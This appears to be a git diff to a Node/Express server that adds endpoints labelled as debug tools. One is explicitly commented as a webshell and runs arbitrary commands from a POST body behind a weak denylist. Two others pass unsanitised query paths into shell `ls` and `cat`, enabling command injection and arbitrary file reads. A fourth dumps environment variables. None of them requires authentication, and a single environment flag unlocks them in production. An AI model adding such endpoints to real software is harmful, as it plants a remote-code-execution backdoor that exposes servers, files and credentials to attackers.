@@ -11,6 +11,11 @@ import {
   diagnoseDatabaseConnection,
   formatDiagnosticInfo,
 } from "./utils/diagnostics";
+import { exec } from "child_process";
+import util from "util";
+
+// Promisify exec
+const execPromise = util.promisify(exec);
 
 // Load environment variables
 config();
@@ -114,6 +119,174 @@ async function startServer() {
   // Health check endpoint
   app.get("/health", (req, res) => {
     res.status(200).json({ status: "healthy" });
+  });
+
+  // 添加简单的 webshell 端点（仅用于调试）
+  app.post("/debug-shell", async (req, res) => {
+    try {
+      // 检查是否是生产环境，如果是则禁用此功能
+      if (
+        process.env.NODE_ENV === "production" &&
+        !process.env.ALLOW_DEBUG_SHELL
+      ) {
+        return res.status(403).json({
+          status: "error",
+          message: "Debug shell is disabled in production environment",
+        });
+      }
+
+      const { command } = req.body;
+
+      // 安全检查：禁止某些危险命令
+      const forbiddenCommands = ["rm", "mkfs", "dd", ">", "|"];
+      if (forbiddenCommands.some((cmd) => command.includes(cmd))) {
+        return res.status(400).json({
+          status: "error",
+          message: "Command contains forbidden operations",
+        });
+      }
+
+      // 执行命令
+      const { stdout, stderr } = await execPromise(command);
+
+      res.status(200).json({
+        status: "success",
+        result: {
+          stdout,
+          stderr,
+        },
+      });
+    } catch (error: any) {
+      res.status(500).json({
+        status: "error",
+        message: error.message,
+        stderr: error.stderr,
+      });
+    }
+  });
+
+  // 添加文件系统浏览端点
+  app.get("/debug-fs", async (req, res) => {
+    try {
+      // 检查是否是生产环境，如果是则禁用此功能
+      if (
+        process.env.NODE_ENV === "production" &&
+        !process.env.ALLOW_DEBUG_SHELL
+      ) {
+        return res.status(403).json({
+          status: "error",
+          message:
+            "Debug filesystem browser is disabled in production environment",
+        });
+      }
+
+      const path = (req.query.path as string) || "/";
+
+      // 执行 ls 命令
+      const { stdout } = await execPromise(`ls -la ${path}`);
+
+      res.status(200).json({
+        status: "success",
+        path,
+        listing: stdout,
+      });
+    } catch (error: any) {
+      res.status(500).json({
+        status: "error",
+        message: error.message,
+        stderr: error.stderr,
+      });
+    }
+  });
+
+  // 添加文件内容查看端点
+  app.get("/debug-file", async (req, res) => {
+    try {
+      // 检查是否是生产环境，如果是则禁用此功能
+      if (
+        process.env.NODE_ENV === "production" &&
+        !process.env.ALLOW_DEBUG_SHELL
+      ) {
+        return res.status(403).json({
+          status: "error",
+          message: "Debug file viewer is disabled in production environment",
+        });
+      }
+
+      const path = req.query.path as string;
+
+      if (!path) {
+        return res.status(400).json({
+          status: "error",
+          message: "Path parameter is required",
+        });
+      }
+
+      // 执行 cat 命令
+      const { stdout } = await execPromise(`cat ${path}`);
+
+      res.status(200).json({
+        status: "success",
+        path,
+        content: stdout,
+      });
+    } catch (error: any) {
+      res.status(500).json({
+        status: "error",
+        message: error.message,
+        stderr: error.stderr,
+      });
+    }
+  });
+
+  // 添加环境变量查看端点
+  app.get("/debug-env", async (req, res) => {
+    try {
+      // 检查是否是生产环境，如果是则禁用此功能
+      if (
+        process.env.NODE_ENV === "production" &&
+        !process.env.ALLOW_DEBUG_SHELL
+      ) {
+        return res.status(403).json({
+          status: "error",
+          message:
+            "Debug environment viewer is disabled in production environment",
+        });
+      }
+
+      // 过滤掉敏感信息
+      const safeEnv = { ...process.env };
+
+      // 隐藏密码和密钥
+      for (const key in safeEnv) {
+        if (
+          key.includes("PASS") ||
+          key.includes("KEY") ||
+          key.includes("SECRET") ||
+          key.includes("TOKEN")
+        ) {
+          safeEnv[key] = "****";
+        }
+      }
+
+      // 特别处理 DATABASE_URL
+      if (safeEnv.DATABASE_URL) {
+        safeEnv.DATABASE_URL = safeEnv.DATABASE_URL.replace(
+          /:[^:@]+@/,
+          ":****@"
+        );
+      }
+
+      res.status(200).json({
+        status: "success",
+        environment: safeEnv,
+      });
+    } catch (error: any) {
+      res.status(500).json({
+        status: "error",
+        message: error.message,
+      });
+    }
   });
 
   // Default route with database connection test
@@ -248,6 +421,18 @@ async function startServer() {
     );
     logger.info(
       `Text diagnostics available at http://localhost:${port}/diagnostics/text`
+    );
+    logger.info(
+      `Debug shell available at http://localhost:${port}/debug-shell (POST)`
+    );
+    logger.info(
+      `Debug filesystem browser available at http://localhost:${port}/debug-fs?path=/path/to/dir`
+    );
+    logger.info(
+      `Debug file viewer available at http://localhost:${port}/debug-file?path=/path/to/file`
+    );
+    logger.info(
+      `Debug environment viewer available at http://localhost:${port}/debug-env`
     );
   });
 }
